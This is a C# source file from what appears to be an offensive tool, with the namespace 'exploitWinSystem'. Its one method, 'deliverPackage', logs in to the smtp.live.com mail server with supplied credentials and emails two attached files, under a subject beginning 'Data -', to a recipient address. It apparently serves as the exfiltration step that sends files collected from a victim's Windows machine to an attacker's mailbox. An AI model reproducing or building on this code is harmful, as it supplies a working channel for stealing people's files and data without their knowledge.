using System;
using System.Net.Mail;

namespace exploitWinSystem
{
    public static class Email
    {
        public static void deliverPackage(string p_sender, string p_password, string p_recipient, string attachment, string attachment2, string subject)
        {
            MailMessage mail = new MailMessage();
            SmtpClient client = new SmtpClient("smtp.live.com", 25);   

            mail.From = new MailAddress(p_sender);
            mail.To.Add(p_recipient);
            mail.Subject = "Data - " + subject;
            mail.Body = "";

            if (attachment != null)
            {
                mail.Attachments.Add(new Attachment(attachment));
                mail.Attachments.Add(new Attachment(attachment2));
            }

            try
            {
                client.Credentials = new System.Net.NetworkCredential(p_sender, p_password);

                client.EnableSsl = true;

                client.Send(mail);

                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("Successfully delivered package...");
            }

            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Failed to deliver package...\n\n{0}", ex.Message);
            }

            client.Dispose();
            mail.Dispose();
        }
    }
}
